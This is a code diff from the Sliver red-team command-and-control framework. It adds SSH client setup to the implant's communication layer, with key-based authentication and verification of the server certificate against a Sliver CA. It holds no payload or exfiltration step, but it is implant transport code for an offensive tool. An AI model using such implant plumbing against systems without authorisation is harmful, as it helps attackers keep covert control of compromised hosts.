@@ -22,19 +22,80 @@ import (
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
+
+	"crypto/x509"
+	"encoding/pem"
 	"errors"
+	"fmt"
 	"io"
 	"net"
+	"strings"
 	"time"
 
 	"github.com/golang/protobuf/proto"
 	"golang.org/x/crypto/ssh"
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/constants"
 )
 
+// SetupClient - The Comm prepares SSH code and security details for a client connection.
+func (comm *Comm) SetupClient(caCert []byte, key []byte, name string) (err error) {
+
+	// The user is the implant. This is important: checked against the implant's certificates.
+	comm.clientConfig.User = name
+
+	// Private key is used to authenticate to the server/pivot.
+	signer, err := ssh.ParsePrivateKey(key)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("SSH failed to parse Private Key: %s", err.Error())
+		// {{end}}
+		return
+	}
+	comm.clientConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
+
+	// This checks the key presented by the server/pivot.
+	hostKeyCallback := func(hostname string, remote net.Addr, key ssh.PublicKey) error {
+
+		pubKey := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(key))) // Trimmed public key in PEM format
+
+		sliverCACertPool := x509.NewCertPool()
+		ok := sliverCACertPool.AppendCertsFromPEM(caCert)
+		if !ok {
+			return fmt.Errorf("Failed to parse SliverCA certificate")
+		}
+
+		block, _ := pem.Decode([]byte(pubKey))
+		if block == nil {
+			return fmt.Errorf("Failed to parse Certificate PEM")
+		}
+		cert, err := x509.ParseCertificate(block.Bytes)
+		if err != nil {
+			return fmt.Errorf("Failed to parse Certificate: %v", err)
+		}
+
+		opts := x509.VerifyOptions{
+			DNSName: hostname,
+			Roots:   sliverCACertPool,
+		}
+
+		// Verify the provided certificate.
+		if _, err := cert.Verify(opts); err != nil {
+			return fmt.Errorf("Failed to verify certificate: %v", err)
+		}
+
+		return nil
+	}
+
+	// Register the host key verification callback
+	comm.clientConfig.HostKeyCallback = hostKeyCallback
+
+	return
+}
+
 // InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
-func (m *Comm) InitClient(conn net.Conn, isTunnel bool, key []byte) (sessionStream io.ReadWriteCloser, err error) {
+func (m *Comm) InitClient(conn net.Conn, isTunnel bool, caCert, key []byte) (sessionStream io.ReadWriteCloser, err error) {
 	// {{if .Config.Debug}}
 	log.Printf("Initiating SSH client connection...")
 	// {{end}}
@@ -45,7 +106,7 @@ func (m *Comm) InitClient(conn net.Conn, isTunnel bool, key []byte) (sessionStre
 	}
 
 	// Pepare the SSH conn/security, and set keepalive policies/handlers.
-	err = m.Setup(false, key)
+	err = m.SetupClient(caCert, key, constants.SliverName)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("failed to setup SSH client connection: %s", err.Error())
